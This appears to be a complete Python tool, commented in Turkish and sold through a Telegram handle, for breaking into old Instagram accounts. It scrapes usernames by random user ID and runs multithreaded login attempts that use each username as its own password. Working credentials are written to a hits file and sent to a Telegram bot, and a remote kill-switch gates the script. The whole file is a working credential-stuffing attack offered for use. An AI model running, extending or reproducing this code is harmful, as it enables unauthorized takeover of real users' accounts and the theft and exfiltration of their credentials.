import requests
import sys
from colorama import Fore, init

init(autoreset=True)

def api_kontrol():
    try:
        url = "https://raw.githubusercontent.com/BatuTeam3128/BatuTeam28/main/durum1.txt"
        response = requests.get(url, timeout=5)
        durum = response.text.strip().upper()
        if durum != "ACIK":
            print(Fore.RED + "[×] 2010-2011 INSTAGRAM USER PASS TOOLUN APİSİ KAPANDI SATIN ALMAK İÇİN:) @BatuX28")
            sys.exit()
    except requests.exceptions.RequestException:
        print(Fore.RED + "[×] API HATASI.")
        sys.exit()

api_kontrol()

# Tool devamı buradan başlar
print(Fore.GREEN + "[✓] BOLL HİTLİ 2010-2011 INSTAGRAM USER PASS TOOL AKTİF TOOL BAŞLIYOR...")



import requests, os, random, time, sys, string, json, threading, webbrowser, base64
from uuid import uuid4
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from cfonts import render
from user_agent import generate_user_agent as uu
from asmix import Instagram
from colorama import Fore, init
init(autoreset=True)


B="\033[1;30m"; R="\033[1;31m"; G="\033[1;97m"; Y="\033[1;33m"
Bl="\033[1;34m"; P="\033[1;35m"; C="\033[1;34m"; E="\033[1;33m"
J="\033[1;31m"; I="\033[1;32m"; H="\x1b[38;5;208m"; M='\x1b[1;37m'
b=random.randint(5,208); bo=f'\x1b[38;5;{b}m'; j=random.randint(5,208); jo=f'\x1b[38;5;{j}m'

Con = Console()
uid = str(uuid4())
a = 0
u = 0
z = 0
j = 0
Ex = 0


bot_token = input("Token gir:")
chat_id = input("id gir: ")
        

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {'chat_id': chat_id, 'text': msg}
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram gönderim hatası: {e}")


def check(username, pasw):
    global a, u, z, j
    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
    }
    data = {
        'uuid': uid,
        'password': pasw,
        'username': username,
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_countn': '0'
    }

    try:
        rii = requests.post(url, headers=headers, data=data, timeout=15)
        re = rii.text
        print(re)

        if '"logged_in_user"' in re:
            os.system('cls' if os.name == 'nt' else 'clear')
            a += 1
            print(f"{Fore.GREEN} Hits{Fore.WHITE}: {u} // {Fore.RED}Bad{Fore.WHITE}: {z} // {Fore.YELLOW}Retries{Fore.WHITE}: {j}\n")
            with open('@BatuX28 [ 2010 - 2011 ] Hits.txt', 'a') as f:
                f.write(f'{username} : {pasw} • @BatuX28 ~ @BatuPython028\n')
            send_telegram(f"✅ Hit!\n👤 {username} @BatuX28 ~ @BatuPython028\n🔐 {pasw}")

        elif '"challenge_required"' in re:
            os.system('cls' if os.name == 'nt' else 'clear')
            u += 1
            print(f"{Fore.GREEN} Hits{Fore.WHITE}: {u} // {Fore.RED}Bad{Fore.WHITE}: {z} // {Fore.YELLOW}Retries{Fore.WHITE}: {j}\n")
            with open('@BatuX28 [ 2010 - 2011 ] Hits.txt', 'a') as f:
                f.write(f'{username} : {pasw} • @BatuX28 ~ @BatuPython028\n')
            send_telegram(f"""
            🔥 𝙃𝙄𝙏 𝘿𝙀𝙏𝙀𝘾𝙏𝙀𝘿 🔥

👤 𝙆𝙪𝙡𝙡𝙖𝙣ı𝙘ı 𝘼𝙙ı: `{username}`
🔐 𝙎𝙞𝙛𝙧𝙚: `{pasw}`
🔗 𝙋𝙧𝙤𝙛𝙞𝙡: instagram.com/{username}

👑 𝗕𝗔𝗧𝗨 𝗧𝗘𝗔𝗠 • @BatuX28 | @BatuPython028
""")
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            z += 1
            print(f"{Fore.CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
            print(f"┃  {Fore.GREEN}✅ Hits   {Fore.WHITE}: {u:<6} {Fore.RED}❌ Bad    {Fore.WHITE}: {z:<6} {Fore.YELLOW}🔁 Hata {Fore.WHITE}: {j:<6} ┃")
            print(f"{Fore.CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n")
    except Exception as e:
        j += 1
        print(f"Hata: {e}")


def Users():
    global Ex
    try:
        LsD = ''.join(random.choices(string.digits, k=4))
        UseriD = str(random.randrange(100000, 17750001))
        vars = json.dumps({'id': UseriD, 'render_surface': 'PROFILE'})
        resp = requests.post('https://www.instagram.com/api/graphql',
            headers={'X-FB-LSD': LsD},
            data={'lsd': LsD, 'variables': vars, 'doc_id': '25618261841150840'},
            timeout=15
        )
        u = resp.json()['data']['user']['username']
        Ex += 1
        open('Batu_List.txt', 'a').write(f"{u}:{u}\n")
        check(u, u)
    except:
        pass


threads = []
for _ in range(20):
    t = threading.Thread(target=lambda: [Users() for _ in range(1000)])
    t.start()
    threads.append(t)
for t in threads:
    t.join()
    
    


